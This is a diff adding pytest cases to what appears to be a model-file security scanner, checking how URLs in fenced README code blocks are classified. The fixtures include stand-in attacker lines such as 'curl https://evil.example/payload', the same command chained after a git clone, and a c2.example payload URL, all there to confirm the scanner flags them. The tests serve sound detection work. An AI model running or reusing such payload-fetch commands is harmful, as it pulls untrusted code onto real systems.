@@ -247,6 +247,8 @@ git clone https://github.com/SandAI-org/MagiAttention.git
 ```yaml
 api_url: http://127.0.0.1:8080/v1/chat/completions
 artifact_url: s3://model-bucket/path/model.bin
+```
+```yaml
 c2_research_reference: https://c2.example/payload
 ```
 """,
@@ -401,6 +403,32 @@ requests.get(payload_url)
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_bare_active_url(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+curl http://localhost:8080/v1/embeddings
+curl https://evil.example/payload
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "https://evil.example/payload"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_executable_loopback_api_request_remains_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "client.py"
     text_path.write_text('requests.get("http://localhost:8080/v1/embeddings")\n', encoding="utf-8")
@@ -482,6 +510,48 @@ git clone https://evil.example/redirect?next=https://github.com/example-org/mode
     assert any(
         check.name == "Network Communication Detection"
         and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_github_ssh_clone_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+git clone git@github.com:example-org/model.git
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_fenced_documentation_github_clone_does_not_hide_chained_download(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+git clone https://github.com/example-org/model.git && curl https://evil.example/payload
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "https://evil.example/payload"
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
